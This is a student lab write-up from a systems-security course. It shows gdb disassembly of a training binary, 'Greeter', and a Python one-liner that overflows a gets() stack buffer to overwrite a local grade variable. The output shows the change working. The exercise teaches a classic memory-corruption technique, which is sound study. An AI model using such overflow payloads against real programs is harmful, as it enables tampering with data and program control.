Security of Systems-n-Services (2024-2025)

Assignment08
Students: Asterinos Karalis 2020030107  - Zografoula Ioanna Neamonitaki 2020030088

*** PART 1 - CHANGE YOUR GRADE ***

We need to find the location where the Grade variable is located using gdb:
In terminal, we run:

1) gdb ./Greeter
2) disas readString

We use disas to display the machine code instructions
Now we get as output: 

   0x08049d95 <+0>:     endbr32
   0x08049d99 <+4>:     push   %ebp
   0x08049d9a <+5>:     mov    %esp,%ebp
   0x08049d9c <+7>:     sub    $0x38,%esp
   0x08049d9f <+10>:    movl   $0x6,-0x10(%ebp)
   0x08049da6 <+17>:    sub    $0xc,%esp
   0x08049da9 <+20>:    lea    -0x30(%ebp),%eax
   0x08049dac <+23>:    push   %eax
   0x08049dad <+24>:    call   0x8058280 <gets>
   0x08049db2 <+29>:    add    $0x10,%esp
   0x08049db5 <+32>:    movl   $0x0,-0xc(%ebp)
   0x08049dbc <+39>:    jmp    0x8049dd9 <readString+68>
   0x08049dbe <+41>:    lea    -0x30(%ebp),%edx
   0x08049dc1 <+44>:    mov    -0xc(%ebp),%eax
   0x08049dcb <+54>:    mov    -0xc(%ebp),%eax
   0x08049dce <+57>:    add    $0x80e6ca0,%eax
   0x08049dd3 <+62>:    mov    %dl,(%eax)
   0x08049dd5 <+64>:    addl   $0x1,-0xc(%ebp)

Here we see : 0x08049d9f <+10>:    movl   $0x6,-0x10(%ebp) 
This is where the grade (6) is stored in memory and that's how we exploit it.
So in order to change our grade we can simply run the command below and replace 9 with 
whatever grade we want from 0 to 9. We cannot set any other number as our grade.

3)python3 -c 'print("A" * 32 + "\x09\x00\x00\x00")' | ./Greeter

Confirm it works:

What is your name?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  , your grade is 9. Have a nice day.
